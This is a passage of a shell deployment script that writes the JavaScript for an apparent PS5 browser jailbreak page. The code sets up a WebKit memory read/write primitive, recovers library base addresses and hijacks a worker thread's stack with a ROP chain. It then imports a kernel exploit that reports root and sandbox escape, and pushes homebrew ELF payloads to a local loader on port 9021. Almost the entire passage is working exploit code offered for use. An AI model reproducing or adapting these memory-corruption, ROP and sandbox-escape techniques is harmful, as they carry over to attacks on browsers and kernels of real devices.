        import { establishPrimitive } from "./webkit.js";
        import { installWindowP } from "./utils/mem.js";

        const output = document.getElementById("console");

        function writeLog(message, type = "log", replace = false) {
          let line = replace ? output.lastElementChild : null;
          if (!line) {
            line = document.createElement("div");
            output.appendChild(line);
          }
          let marker = "*";
          if (type === "error") marker = "-";
          if (type === "info" || type === "success") marker = "+";
          line.textContent = `[${marker}] ${message}`;
          output.scrollTop = output.scrollHeight;
        }

        function writeEvent(name, detail, type) {
          writeLog(detail == null || detail === "" ? name : `${name}: ${detail}`,
            type || (name === "Failed" ? "error" : "log"));
        }

        window.writeLog = writeLog;
        window.jb = { mark: writeEvent };

        async function getPrimitive() {
          writeLog("Starting WebKit exploit");
          const primitive = installWindowP(await establishPrimitive(writeEvent));
          if (!primitive || typeof primitive.read8 !== "function")
            throw new Error("Memory primitive unavailable");

          writeLog("ARW ready", "success");
          return primitive;
        }

        function getWebKitBase() {
          const ctor = globalThis.__ps5NativeCtor;
          if (typeof ctor !== "number" || typeof OFFSET_wk_host_constructor_candidates === "undefined")
            throw new Error("WebKit base inputs are unavailable");

          for (const offset of OFFSET_wk_host_constructor_candidates) {
            const base = ctor - offset;
            if (base >= 0x800000000 && base < 0x900000000 && base % 0x4000 === 0)
              return base;
          }

          throw new Error("WebKit base not found");
        }

        async function run() {
          const rejection = window.firmware.rejection();
          if (rejection)
            throw new Error(rejection);
          writeLog("Credits: Sonic_Iso, Jordy, ntfargo, ufm42, Dr. Yenyen, TheFlow, SlidyBat, Flatz, cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion", "info");
          writeLog(`Agent: ${navigator.userAgent}`, "info");
          writeLog(`Firmware: ${window.fw_str}`, "info");
          const primitive = await getPrimitive();
          writeLog(`WebKit base: 0x${getWebKitBase().toString(16)}`, "info");

          await import("./relapse_exploit.js");
          const runtime = await main(primitive);
          if (runtime && runtime.payloadsLoaded) {
            const { initializePayloadSender } = await import("./payload_loader.js");
            initializePayloadSender(runtime.p, runtime.chain);
          }
        }

        run().catch((error) => writeLog(error instanceof Error ? error.message : String(error), "error"));
        SITE_EOF
        cat > /srv/www/src/main.js <<'MAIN_EOF'
        function countFingerprints(p, stack, expected) {
          let count = 0;
          for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
            const v = p.read8(stack.add32(offset));
            if (v.low === expected.low && v.hi === expected.hi) count++;
          }
          return count;
        }

        async function findWorkerStack(p, libKernelBase) {
          const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
          const PTHREAD_STACK_ADDR_OFFSET = 0xa8;
          const PTHREAD_STACK_SIZE_OFFSET = 0xb0;

          const plausible = (a) =>
            a.hi >= 0 && a.hi < 0x8000 && a.low >= 0x10000 && (a.low & 0x7) === 0;

          const head = libKernelBase.add32(OFFSET_lk__thread_list);

          // Collect every plausibility-gated 0x80000 stack.
          const stacks = [];
          let steps = 0;
          for (
            let thread = p.read8(head);
            thread.low != 0x0 && thread.hi != 0x0 && steps++ < 512;
          ) {
            if (!plausible(thread)) break;

            const next = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET));
            const stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
            const stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
            if (stacksz.hi === 0 && stacksz.low === 0x80000 && plausible(stack))
              stacks.push(stack);
            thread = next;
          }
          if (stacks.length === 0)
            throw new Error(`failed to find worker. (libkernel thread_list @ 0x${head.toString()}; scanned ${steps} thread nodes)`);

          // fingerprint-select. The rop_slave thread parks in the libkernel
          const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
          for (let attempt = 0; attempt < 50; attempt++) {
            const hits = stacks.filter((stack) =>
              countFingerprints(p, stack, expected) > 0,
            );
            if (hits.length === 1) return hits[0];
            if (hits.length === 0) {
              await new Promise((resolve) => setTimeout(resolve, 1));
              continue;
            }
            throw new Error(`worker-stack signature ambiguous: ${hits.length}/${stacks.length} plausible 0x80000 stacks are parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)}`);
          }
          throw new Error(`no plausible 0x80000 stack parked at kbase+${(OFFSET_lk_worker_wait_return >>> 0).toString(16)} after retries (${stacks.length} candidates scanned)`);
        }

        async function findWorkerReturnSlot(p, stack, libKernelBase) {
          const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
          let lastCount = 0;

          for (let attempt = 0; attempt < 50; attempt++) {
            let hit = null;
            let count = 0;
            for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {
              const candidate = stack.add32(offset);
              const value = p.read8(candidate);
              if (value.low !== expected.low || value.hi !== expected.hi) continue;

              hit = candidate;
              count++;
            }
            if (count === 1) {
              return hit;
            }
            lastCount = count;
            await new Promise((resolve) => setTimeout(resolve, 1));
          }
          throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
        }

        function log(message, type = "log") {
          window.writeLog(message, type);
        }

        const ROP_WAIT_MS = 20000;

        function jbmark(tag, detail) {
          try {
            if (window.jb && typeof window.jb.mark === "function")
              window.jb.mark(tag, String(detail));
          } catch (e) {}
        }

        async function prepareRop(p) {
          const ctor = globalThis.__ps5NativeCtor;
          let webkitBase;
          if (typeof ctor === "number" && typeof OFFSET_wk_host_constructor_candidates !== "undefined") {
            for (const offset of OFFSET_wk_host_constructor_candidates) {
              const candidate = ctor - offset;
              if (candidate >= 0x800000000 && candidate < 0x900000000 && candidate % 0x4000 === 0) {
                webkitBase = candidate;
                break;
              }
            }
          }
          if (webkitBase === undefined)
            throw new Error("no host-constructor candidate gave a valid base (ctor=0x" + String(ctor) + ")");
          const libSceNKWebKitBase = new int64(webkitBase % 0x100000000,
            Math.floor(webkitBase / 0x100000000));

          let libSceLibcInternalBase = p.read8(
            libSceNKWebKitBase.add32(OFFSET_wk_memset_import),
          );
          libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

          let libKernelBase = p.read8(
            libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import),
          );
          libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

          const gadgets = {};
          const syscalls = {};

          for (const gadget in wk_gadgetmap) {
            gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
          }
          for (const sysc in syscall_map) {
            syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
          }

          const allocations = [];

          function malloc(size, type = 4) {
            const backing =
              type === 1
                ? new Uint8Array(1000 + size)
                : new Uint32Array(0x10000 + size);
            allocations.push(backing);

            const ptr = p.read8(p.leakval(backing).add32(0x10));
            ptr.backing = backing;
            return ptr;
          }

          function stringify(str) {
            const bufView = new Uint8Array(str.length + 1);
            for (let i = 0; i < str.length; i++) {
              bufView[i] = str.charCodeAt(i) & 0xff;
            }

            const ptr = p.read8(p.leakval(bufView).add32(0x10));
            ptr.backing = bufView;
            return ptr;
          }

          function writestr(addr, str) {
            let waddr = addr.add32(0);
            if (typeof str == "string") {
              for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                  break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
              }
            }
            p.write1(waddr, 0x0);
          }

          const worker = new Worker("./src/utils/rop_slave.js");

          async function waitForWorker() {
            return new Promise((resolve, reject) => {
              worker.onmessage = () => resolve();
              worker.onerror = () => reject(new Error("Worker failed to load"));
              worker.postMessage(0);
            });
          }

          jbmark("Worker", "waiting");
          await waitForWorker();
          jbmark("Worker", "ready");

          const workerStack = await findWorkerStack(p, libKernelBase);
          const originalContext = malloc(0x40);

          const returnAddress = await findWorkerReturnSlot(p, workerStack, libKernelBase);
          const originalReturnAddress = p.read8(returnAddress);
          const stackPointerSlot = returnAddress.add32(0x8);

          function prepareChain(chain) {
            chain.push(gadgets["pop rdi"]);
            chain.push(originalContext);
            chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
          }

          async function launchChain(chain) {
            const originalStackPointer = p.read8(stackPointerSlot);
            chain.push_write8(originalContext, originalReturnAddress);
            chain.push_write8(originalContext.add32(0x10), returnAddress);
            chain.push_write8(stackPointerSlot, originalStackPointer);
            chain.push(gadgets["pop rdi"]);
            chain.push(originalContext);
            chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

            p.write8(returnAddress, gadgets["pop rsp"]);
            p.write8(stackPointerSlot, chain.stack_entry_point);

            const completed = await new Promise((resolve) => {
              let settled = false;
              const finish = (value) => {
                if (settled) return;
                settled = true;
                resolve(value);
              };
              worker.onmessage = () => finish(true);
              setTimeout(() => finish(false), ROP_WAIT_MS);
              worker.postMessage(0);
            });

            if (!completed)
              throw new Error(`the rop worker never answered in ${ROP_WAIT_MS / 1000}s - refusing to continue on a chain that never ran. (Reload.)`);
          }

          const runtime = {
            write8: p.write8,
            write4: p.write4,
            write2: p.write2,
            write1: p.write1,
            read8: p.read8,
            read4: p.read4,
            read2: p.read2,
            read1: p.read1,
            leakval: p.leakval,
            pre_chain: prepareChain,
            launch_chain: launchChain,
            malloc,
            stringify,
            writestr,
            libSceLibcInternalBase,
            libKernelBase,
            syscalls,
            gadgets,
          };

          const chain = new worker_rop(runtime);

          const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);
          p.write8(chain.return_value, JB_POISON);
          const pid = await chain.syscall(SYS_GETPID);
          if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
            throw new Error("Worker chain did not execute; the return slot is unchanged.");
          }

          if (pid.low == 0) {
            throw new Error("WebKit exploit failed.");
          }
          jbmark("Worker chain", "ready");

          return { p: runtime, chain };
        }

        async function main(userlandRW) {
          const { p, chain } = await prepareRop(userlandRW);
          const { runKernelExploit } = await import("./relapse_exploit.js");
          const result = await runKernelExploit(p, chain, log);
          if (!result || !result.done)
            throw new Error("kernel exploit did not finish");

          if (result.payloads) {
            log("kernel exploit complete", "info");
            log("elfldr is listening on port 9021", "info");
          } else {
            log("kernel chain complete: root and sandbox escape are active", "info");
            log("elfldr did not load, payload sending is unavailable", "error");
          }
          return { p, chain, payloadsLoaded: !!result.payloads };
        }

        const fwScript = document.createElement("script");
        document.body.appendChild(fwScript);

        fwScript.setAttribute("src", `offsets/${window.fw_str}.js?v=` + Date.now());
        MAIN_EOF
        cat > /srv/www/src/payload_loader.js <<'LOADR_EOF'
        // All-in-one payload sender: after the kernel exploit leaves elfldr listening
        // on 127.0.0.1:9021, payloads are pushed through a ROP-driven TCP connection
        // so the whole chain runs from this single page.

        const AF_INET = 2;
        const SOCK_STREAM = 1;
        const ELFLDR_PORT = 9021;

        const PAYLOADS = [
          {
            file: "kstuff.elf",
            id: "kstuff",
            title: "kstuff-lite 1.11",
            desc: "内核补丁：FSELF / FPKG 支持（FW 1.00 - 13.60）",
            source: "https://github.com/EchoStretch/kstuff-lite",
          },
          {
            file: "etaHEN-2.5B.bin",
            id: "etahen",
            title: "etaHEN 2.5B",
            desc: "AIO HEN：Toolbox / FTP(1337) / PKG 安装器(9090)",
            source: "https://github.com/etaHEN/etaHEN",
          },
          {
            file: "shadowmountplus.elf",
            id: "smp",
            title: "ShadowMountPlus 1.7beta3",
            desc: "游戏镜像自动挂载（需要 kstuff 运行中）",
            source: "https://github.com/drakmor/ShadowMountPlus",
          },
        ];

        // kstuff patches the kernel first, etaHEN builds HEN on top of it, and
        // ShadowMountPlus then mounts game images (its kstuff auto-pause logic
        // expects kstuff to be alive).
        const AUTO_CHAIN = ["kstuff.elf", "etaHEN-2.5B.bin", "shadowmountplus.elf"];
        const AUTO_STEP_DELAY_MS = 4000;

        let runtime = null;
        let running = false;

        function log(message, type = "log") {
          if (typeof window.writeLog === "function") window.writeLog(message, type);
        }

        function sleep(ms) {
          return new Promise((resolve) => setTimeout(resolve, ms));
        }

        function findPayload(file) {
          const entry = PAYLOADS.find((p) => p.file === file);
          if (!entry) throw new Error("未知 payload: " + file);
          return entry;
        }

        function card(file) {
          return document.getElementById("card-" + findPayload(file).id);
        }

        function setStatus(file, state, text) {
          const node = card(file);
          if (!node) return;
          node.dataset.state = state;
          const label = node.querySelector(".status");
          if (label && text) label.textContent = text;
        }

        async function loadIntoMemory(file) {
          const response = await fetch("payloads/" + file + "?v=" + Date.now());
          if (!response.ok) throw new Error(file + " 下载失败 HTTP " + response.status);
          const bytes = new Uint8Array(await response.arrayBuffer());

          const magic = (bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24)) >>> 0;
          if (magic !== 0x464c457f) throw new Error(file + " 不是有效的 ELF 文件");

          const buffer = runtime.p.malloc(bytes.length + 0x10, 1);
          buffer.backing.set(bytes);
          if (runtime.p.read4(buffer) >>> 0 !== 0x464c457f)
            throw new Error(file + " 内存副本校验失败");

          return { ptr: buffer, size: bytes.length };
        }

        async function sendToElfldr(ptr, size) {
          const p = runtime.p;
          const chain = runtime.chain;

          // sockaddr_in: { len: 0x10, family: AF_INET, port: htons(9021), addr: htonl(127.0.0.1) }
          const addr = p.malloc(0x10, 1);
          for (let i = 0; i < 0x10; i++) p.write1(addr.add32(i), 0);
          p.write1(addr.add32(0x0), 0x10);
          p.write1(addr.add32(0x1), AF_INET);
          p.write2(addr.add32(0x2), ((ELFLDR_PORT & 0xff) << 8) | ((ELFLDR_PORT >> 8) & 0xff));
          p.write4(addr.add32(0x4), (127) | (0 << 8) | (0 << 16) | (1 << 24));

          const fd = ((await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low | 0);
          if (fd < 0) throw new Error("socket() 失败 (" + fd + ")");

          try {
            const connected = (await chain.syscall(SYS_CONNECT, fd, addr, 0x10)).low | 0;
            if (connected < 0)
              throw new Error("connect() 127.0.0.1:" + ELFLDR_PORT + " 失败，elfldr 是否在监听？");

            let sent = 0;
            while (sent < size) {
              const written = (await chain.syscall(SYS_WRITE, fd, ptr.add32(sent), size - sent)).low | 0;
              if (written < 0) throw new Error("write() 失败 (" + written + ")");
              if (written === 0) throw new Error("write() 返回 0，连接被对端关闭");
              sent += written;
              log("  已发送 " + sent + " / " + size + " 字节");
            }
          } finally {
            await chain.syscall(SYS_CLOSE, fd);
          }
        }

        export async function sendPayload(file) {
          if (!runtime) throw new Error("漏洞利用尚未完成");
          if (running) {
            log("已有 payload 正在发送，请稍候", "error");
            return false;
          }

          const entry = findPayload(file);
          running = true;
          setStatus(file, "sending", "发送中…");
          log("发送 " + entry.title + " → 127.0.0.1:" + ELFLDR_PORT, "info");

          try {
            const { ptr, size } = await loadIntoMemory(file);
            await sendToElfldr(ptr, size);
            setStatus(file, "done", "已发送");
            log(entry.title + " 发送完成（" + size + " 字节）", "success");
            return true;
          } catch (error) {
            setStatus(file, "failed", "失败");
            log(entry.title + " 发送失败: " + (error instanceof Error ? error.message : error), "error");
            return false;
          } finally {
            running = false;
          }
        }

        export async function runAutoChain() {
          if (!runtime || running) return;
          const button = document.getElementById("btn-autochain");
          if (button) button.disabled = true;

          log("开始一键加载: " + AUTO_CHAIN.join(" → "), "info");
          for (let i = 0; i < AUTO_CHAIN.length; i++) {
            await sendPayload(AUTO_CHAIN[i]);
            if (i < AUTO_CHAIN.length - 1) {
              log("等待 " + AUTO_STEP_DELAY_MS / 1000 + " 秒后发送下一个…");
              await sleep(AUTO_STEP_DELAY_MS);
            }
          }
          log("一键加载流程结束，查看主机屏幕上的通知确认", "success");
          if (button) button.disabled = false;
        }

        export function initializePayloadSender(p, chain) {
          runtime = { p, chain };

          const panel = document.getElementById("payload-panel");
          if (panel) panel.classList.remove("hidden");

          for (const entry of PAYLOADS) {
            const button = document.getElementById("send-" + entry.id);
            if (button)
              button.addEventListener("click", () => {
                sendPayload(entry.file);
              });
          }

          const auto = document.getElementById("btn-autochain");
          if (auto)
            auto.addEventListener("click", () => {
              runAutoChain();
            });

          const checkbox = document.getElementById("autochain-opt");
          if (checkbox && checkbox.checked) runAutoChain();
        }
        LOADR_EOF

        # ---------- 自签证书（SAN 必须有；剩余不足 7 天才重建） ----------
